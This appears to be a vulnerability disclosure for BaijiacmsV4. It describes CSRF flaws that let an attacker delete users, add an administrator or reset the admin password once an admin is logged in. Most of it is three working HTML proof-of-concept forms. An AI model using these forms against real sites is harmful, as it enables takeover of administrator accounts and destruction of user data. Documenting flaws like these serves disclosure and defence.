# why make this

BaijiacmsV4 does not open the issue, it is only possible to write a vulnerability here.

After administrator logged in, attacker can use CSRF add a new administrator or delete any user(include administrator), you can even change admin account password without using any password.

# poc
## del any user

poc:
```
<html>
<body>
    <script>
        history.pushState('', '', '/')
    </script>
    <form action="http://localhost/index.php">
        <input type="hidden" name="mod" value="site" />
        <input type="hidden" name="op" value="deleteuser" />
        <input type="hidden" name="id" value="3" />
        <!--del user with id -->
        <input type="hidden" name="act" value="manager" />
        <input type="hidden" name="do" value="user" />
        <input type="hidden" name="beid" value="1" />
        <input type="submit" value="Submit request" />
    </form>
</body>
</html>
```
## add a user(admin)

poc:
```
<html>
<body>
    <script>
        history.pushState('', '', '/')
    </script>
    <form action="http://localhost/index.php?mod=site&op=edituser&act=manager&do=user&beid=1" method="POST">
        <input type="hidden" name="id" value="" />
        <input type="hidden" name="is&#95;admin" value="1" />
        <!-- add a admin -->
        <input type="hidden" name="store" value="0" />
        <input type="hidden" name="username" value="tester1" />
        <input type="hidden" name="newpassword" value="123456" />
        <input type="hidden" name="confirmpassword" value="123456" />
        <input type="hidden" name="submit" value="%E6%8F%90%E4%BA%A4" />
        <input type="submit" value="Submit request" />
    </form>
</body>
</html>
```
## change admin password

poc:
```
<html>
<body>
    <script>
        history.pushState('', '', '/')
    </script>
    <form action="http://localhost/index.php?mod=site&op=changepwd&id=1&act=manager&do=user&beid=1" method="POST">
        <input type="hidden" name="username" value="admin" />
        <!--only use username -->
        <input type="hidden" name="newpassword" value="12345678" />
        <input type="hidden" name="confirmpassword" value="12345678" />
        <input type="hidden" name="submit" value="%E6%8F%90%E4%BA%A4;" />
        <input type="submit" value="Submit request" />
    </form>
</body>
</html>
```